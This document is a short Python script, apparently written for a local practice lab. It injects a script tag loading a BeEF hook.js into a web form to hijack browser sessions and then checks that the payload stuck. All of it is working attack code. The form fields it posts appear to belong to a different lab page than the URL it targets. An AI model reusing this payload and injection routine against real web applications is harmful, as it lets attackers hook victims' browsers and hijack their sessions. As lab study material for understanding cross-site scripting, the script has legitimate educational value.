# Cross-Site Scripting (XSS) and BeEF
# This Python class provides methods to perform session hijacking against the target URL
# (http://127.0.0.1/vulnerabilities/xss_d/) using the BeEF tool. Cross-Site Scripting (XSS) 
# attacks exploit vulnerabilities in web applications to inject malicious scripts, allowing attackers 
# to perform actions such as session hijacking.

import requests

class XSSHijacker:
    def __init__(self, session):
        self.session = session
        self.target_url = 'http://127.0.0.1/vulnerabilities/xss_d/'
        self.payload_url = 'http://127.0.0.1:3000/hook.js'  # URL of the BeEF hook script

    def inject_xss_payload(self):
        payload = f'<script src="{self.payload_url}"></script>'
        data = {'btnSign': '', 'mtxMessage': payload}
        response = self.session.post(self.target_url, data=data)
        return response

    def check_vulnerability(self):
        response = self.session.get(self.target_url)
        if response.status_code == 200 and self.payload_url in response.text:
            return True
        return False

def main():
    with requests.Session() as s:
        hijacker = XSSHijacker(s)
        
        # Inject the XSS payload
        response = hijacker.inject_xss_payload()
        print("Payload Injection Response:", response.status_code)
        
        # Check if XSS was successful
        success = hijacker.check_vulnerability()
        print("XSS Payload Successfully Injected:", success)

if __name__ == '__main__':
    main()
